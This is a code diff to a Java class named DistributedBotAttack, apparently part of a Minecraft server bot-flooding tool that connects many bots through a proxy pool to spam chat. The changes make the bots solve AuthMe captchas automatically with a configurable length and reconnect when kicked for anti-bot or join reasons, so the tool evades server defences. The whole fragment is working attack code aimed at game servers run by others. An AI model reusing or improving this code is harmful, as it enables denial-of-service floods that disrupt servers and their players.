@@ -30,9 +30,7 @@ import org.spacehq.packetlib.tcp.TcpSessionFactory;
 import org.spacehq.packetlib.packet.*;
 import org.spacehq.mc.protocol.packet.ingame.client.player.ClientSwingArmPacket;
 import org.spacehq.mc.protocol.packet.ingame.client.player.ClientChangeHeldItemPacket;
-import org.spacehq.mc.protocol.packet.ingame.client.player.ClientPlayerRotationPacket;
 
-import luohuayu.ACProtocol.ACProtocol;
 import luohuayu.EndMinecraftPlus.Utils;
 import luohuayu.EndMinecraftPlus.proxy.ProxyPool;
 import luohuayu.MCForgeProtocol.MCForge;
@@ -48,10 +46,6 @@ public class DistributedBotAttack extends IAttack {
 
 	public List<Client> clients = new ArrayList<Client>();
 	public ExecutorService pool = Executors.newCachedThreadPool();
-
-	private ACProtocol acp = new ACProtocol();
-
-	private long starttime;
 
 	public DistributedBotAttack(int time, int maxconnect, int joinsleep, boolean motdbefore, boolean tab,
 			HashMap<String, String> modList) {
@@ -98,7 +92,9 @@ public class DistributedBotAttack extends IAttack {
 			spammessage = config.getValue("custommessage");
 
 		}
-		this.starttime = System.currentTimeMillis();
+		if (!config.getBoolean("log")) {
+			System.out.println("[警告]你没有开启日志");
+		}
 
 		mainThread = new Thread(() -> {
 			while (true) {
@@ -175,17 +171,7 @@ public class DistributedBotAttack extends IAttack {
 			}
 		});
 
-		// test = config.getBoolean("test");
-		// if (test) {
-		// Utils.log("你正在以测试模式运行！");
-		// String username = name + Utils.getRandomString(4, 8);
-		// Client client = new Client(ip, port, new MinecraftProtocol("112121145"),
-		// new TcpSessionFactory());
-		// newlistener(client, "112121145", ip, port);
-		// client.getSession().connect();
-		// } else if (true) {
 		mainThread.start();
-		// }
 		regThread.start();
 		if (tabThread != null)
 			tabThread.start();
@@ -273,22 +259,14 @@ public class DistributedBotAttack extends IAttack {
 						// try to get authme code
 						boolean iscaptcha = message.contains("人机验证") || message.contains("captcha")
 								|| message.contains("验证码");
-						boolean isauthcode = message.contains("请输入验证码：");
 						String[] code2 = message.split("/captcha ", 2);
+						int length = config.toint(config.getValue("authmelength"));
 						if (iscaptcha) {
-							String c0de = code2[1].substring(0, 5);
+							String c0de = code2[1].substring(0, length);
 							if (debug) {
 								Utils.log("Captcha is:" + c0de);
 							}
 							client.getSession().send(new ClientChatPacket("/captcha " + c0de));
-						}
-						if (isauthcode) {
-							String authcode = Utils.getcode(8, message);
-							if (debug) {
-								Utils.log(username + " 验证码是：" + authcode);
-							}
-							client.getSession().send(new ClientChatPacket(authcode));
-
 						}
 					}
 				}
@@ -326,15 +304,11 @@ public class DistributedBotAttack extends IAttack {
 				}
 				Utils.log("Client", "[断开][" + username + "] " + msg);
 				String reason = e.getReason();
-				boolean status = reason.contains("重");
-				boolean status1 = reason.contains("join");
-				if (status || status1) {
+				boolean status = reason.contains("重") || reason.contains("join") || reason.contains("antibot")
+						|| reason.contains("加入");
+				if (status) {
 					Utils.log("[" + username + "]正在重连......");
-					Client client = new Client(ip, port, new MinecraftProtocol(username), new TcpSessionFactory(proxy));
 					client.getSession().connect(true);
-					if (debug) {
-						Utils.log("[Listener]" + "[" + username + "]" + ip + "," + proxy.toString());
-					}
 
 				}
 			}
